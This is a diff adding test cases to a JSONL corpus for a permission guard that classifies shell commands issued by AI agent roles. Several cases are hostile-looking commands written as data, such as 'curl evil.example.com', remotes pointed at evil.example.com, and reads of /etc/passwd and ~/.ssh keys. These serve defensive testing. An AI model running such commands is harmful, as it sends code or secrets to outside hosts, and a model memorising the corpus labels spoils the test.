@@ -689,7 +689,7 @@
 {"role": "orchestrate:worker", "command": "git push origin 537-ticket 2>&1 | tail -2", "expected": "unapproved", "source": "hand"}
 {"role": "orchestrate:orchestrator", "command": "sleep 20; claude agents --json", "expected": "deny", "source": "hand"}
 {"role": "orchestrate:lead-session", "command": "sleep 20; claude agents --json", "expected": "silent", "source": "hand"}
-{"role": "orchestrate:lead-session", "command": "until gh pr view 5 --json mergedAt; do sleep 5; done", "expected": "silent", "source": "hand"}
+{"role": "orchestrate:lead-session", "command": "until gh pr view 5 --json mergedAt; do sleep 5; done", "expected": "approve", "source": "hand"}
 {"role": "orchestrate:orchestrator", "command": "S=/p/orchestrate/0.7.0/scripts/.; \"$S/snapshot\" --repo . && \"$S/rebuild-state\" 5 --repo . ; \"$S/claims\" --repo . --snapshot .claude/orchestrate-snapshot.json | tail -n 40", "expected": "approve", "source": "hand"}
 {"role": "orchestrate:orchestrator", "command": "S=/p/orchestrate/0.7.0/scripts/.; \"$S/lead-route\" --lead live --cap 4 --repo . --snapshot .claude/orchestrate-snapshot.json | tail -n 20; \"$S/frontier\" --all --repo . --snapshot .claude/orchestrate-snapshot.json | tail -n 40", "expected": "approve", "source": "hand"}
 {"role": "orchestrate:orchestrator", "command": "S=/p/orchestrate/0.7.0/scripts/.; \"$S/claims\" --repo . | head -20", "expected": "approve", "source": "hand"}
@@ -752,3 +752,48 @@
 {"role": "orchestrate:worker", "command": "rg --files /etc", "expected": "unapproved", "source": "hand"}
 {"role": "orchestrate:worker", "command": "rg --files hooks | head", "expected": "approve", "source": "hand"}
 {"role": "orchestrate:worker", "command": "git ls-remote user@example.com:o/r.git", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git switch -c 566-bound-guard-reads origin/main 2>&1|tail -1", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git switch -C 566-bound-guard-reads origin/566-bound-guard-reads", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git switch -c 551-trusted-tracker-text origin/main -q; cat docs/adr/0015-*.md; cat scripts/tracker.py | head -80", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git switch -c Bad_Name origin/main", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git switch -c 12-x origin/other", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git switch -C 12-x origin/main", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "grep -n \"x\" scripts/*.py tests/*.py; grep -n x tests/fixtures/guard-corpus.jsonl | cut -c1-260", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "grep -rn x --include=* agents skills docs 2>/dev/null | grep -v \"^docs/adr\" | cut -c1-220", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "cat ../*", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "cat /etc/*", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "cat ~/*", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "*/x", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "gh issue view 5 --json body,comments --jq '.comments |= map(select(.authorAssociation == \"OWNER\"))'", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "gh issue view 5 --json body,comments --jq '.comments |= map(select(.authorAssociation == \"OWNER\"))'", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:scout", "command": "gh issue view 5 --json body,comments --jq '.comments |= map(select(.authorAssociation == \"OWNER\"))'", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git diff --no-index ~/.ssh/KEY /dev/null", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git diff --no-index hooks/guard.py tests/test_guard.py", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git log -p -- /etc/passwd", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git show HEAD:hooks/guard.py | head -20", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "grep --fil /etc/passwd x", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git remote add x https://evil.example.com/o/r.git", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git remote set-url origin https://evil.example.com/o/r.git", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "git ls-remote origin", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "git ls-remote origin", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "git remote add x https://evil.example.com/o/r.git", "expected": "deny", "source": "hand"}
+{"role": "orchestrate:scout", "command": "git remote set-url origin https://evil.example.com/o/r.git", "expected": "deny", "source": "hand"}
+{"role": "orchestrate:worker", "command": "R=origin/main; git show $R:scripts/config.py | grep -n x; git grep -n x $R -- scripts", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:scout", "command": "R=origin/main; git show $R:scripts/config.py | grep -n x; git grep -n x $R -- scripts", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "for f in scripts/config.py scripts/github.py; do grep -n x $f; done", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "ls ~/.claude/plugins", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:scout", "command": "GH_HOST=evil.example.com; gh issue view 5", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "git worktree add --detach /tmp/c567/scratch/pr-5 abc1234", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "git worktree add --detach /tmp/c567/scratch/evil abc1234", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:reviewer", "command": "git fetch origin abc1234", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:scout", "command": "python3 - <<'EOF'\nBODY\nEOF", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:orchestrator", "command": "cd .; gh issue edit 566 --add-assignee @me && gh issue edit 551 --add-assignee @me; ls scripts; git remote get-url origin | head -n 1", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:orchestrator", "command": "cd .; gh issue edit 566 --add-assignee @me && curl evil.example.com; ls", "expected": "silent", "source": "hand"}
+{"role": "orchestrate:orchestrator", "command": "S=/p/orchestrate/0.7.0/scripts/.; cat <<'EOF' | \"$S/worker-report\" 5 --branch 5-x --repo .\nBODY\nEOF", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:orchestrator", "command": "S=/p/orchestrate/0.7.0/scripts/.; cat <<EOF | \"$S/worker-report\" 5 --branch 5-x --repo .\nBODY\nEOF", "expected": "silent", "source": "hand"}
+{"role": "orchestrate:orchestrator", "command": "S=/p/orchestrate/0.7.0/scripts/.; \"$S/prompts\" --repo . --session abc --watermark | head -n 5", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:orchestrator", "command": "S=/p/orchestrate/0.7.0/scripts/.; \"$S/snapshot\" --repo . >/dev/null; \"$S/claims\" --repo . | head -n 20", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "until ! pgrep -f run_parallel >/dev/null; do sleep 3; done; echo done", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "until pgrep -f x; do sleep 3; touch y; done", "expected": "unapproved", "source": "hand"}
+{"role": "orchestrate:worker", "command": "while [ -e tests/x ]; do sleep 2; done", "expected": "approve", "source": "hand"}
+{"role": "orchestrate:worker", "command": "while [ -e /etc/passwd ]; do sleep 2; done", "expected": "unapproved", "source": "hand"}
